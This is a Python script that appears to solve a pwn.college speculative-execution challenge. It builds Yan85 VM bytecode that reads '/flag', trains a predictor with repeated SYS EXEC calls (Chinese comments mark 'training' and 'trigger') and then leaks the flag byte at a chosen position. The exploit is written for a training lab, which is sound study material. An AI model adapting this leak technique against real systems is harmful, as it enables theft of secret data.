# Microarchitecture Exploitation - Ghost in the YPU 2
# https://pwn.college/system-security/speculative-execution/level12
import sys

from dojotool.yan85_vm import Yan85VM


def setting_vm(vm: Yan85VM):
    vm.encoding.set_instruction_layout(("opcode", "arg1", "arg2"))
    opcode_encoding = {
        "SYS": 0x04,
        "LDM": 0x80,
        "STK": 0x40,
        "ADD": 0x01,
        "IMM": 0x20,
        "CMP": 0x02,
        "STM": 0x08,
        "JMP": 0x10,
    }
    for opcode, encoding in opcode_encoding.items():
        vm.encoding.set_opcode_encoding(opcode, encoding)

    register_encoding = {
        "a": 0x20,
        "b": 0x40,
        "c": 0x08,
        "d": 0x02,
        "s": 0x04,
        "i": 0x01,
        "f": 0x10,
        "ds": 0x80,
        "none": 0x00,
    }
    for reg, encoding in register_encoding.items():
        vm.encoding.set_register_encoding(reg, encoding)

    flag_encoding = {
        "L": 0x10,
        "G": 0x04,
        "E": 0x01,
        "N": 0x08,
        "Z": 0x02,
        "*": 0,
    }
    for flag, encoding in flag_encoding.items():
        vm.encoding.set_flag_encoding(flag, encoding)

    syscall_encoding = {
        "OPEN": 0x08,
        "READ": 0x20,
        "EXEC": 0x40,
        "EXIT": 0x10,
    }
    for syscall, encoding in syscall_encoding.items():
        vm.encoding.set_syscall_encoding(syscall, encoding)


def bytecode_write_string(addr: int, s: str) -> str:
    bytecode = ""
    for i, c in enumerate(s):
        bytecode += f"""
        IMM a = {hex(addr + i)}
        IMM b = {hex(ord(c))}
        STM *a = b
        """
    return bytecode


def bytecode_open_read_file(open_offset: int, read_offset: int, read_length: int) -> str:
    bytecode = f"""
    IMM ds = 0
    # open(open_offset, 0x00) = fd(a)
    # read(fd(a), read_offset, read_length)
    IMM a = {hex(open_offset)}
    IMM b = 0x00
    SYS OPEN a
    IMM b = {hex(read_offset)}
    IMM c = {hex(read_length)}
    SYS READ a
    """
    return bytecode


def compile() -> None:
    pos = int(sys.argv[1])

    offset_path = 0x00
    offset_read = 0x00
    bytecode = f"""
    {bytecode_write_string(offset_path, "/flag")}
    {bytecode_open_read_file(offset_path, offset_read, 0x40)}
    # 在特殊地址写个非零值
    IMM a = 0x00
    IMM b = 0x01
    IMM ds = 0x30
    STM *a = b

    # 训练
    SYS EXEC a
    SYS EXEC a
    SYS EXEC a
    SYS EXEC a
    SYS EXEC a
    # 触发
    IMM a = {hex(pos)}
    IMM ds = 0x80
    SYS OPEN a
    SYS EXIT a
    """

    vm = Yan85VM()
    setting_vm(vm)
    bytecode = vm.assemble(bytecode)
    sys.stdout.buffer.write(b"YPU\0\2\0")
    sys.stdout.buffer.write(bytecode)
    sys.stdout.buffer.flush()

    # print('\n'.join(vm.disassemble(bytecode)))


if __name__ == "__main__":
    raise SystemExit(compile())
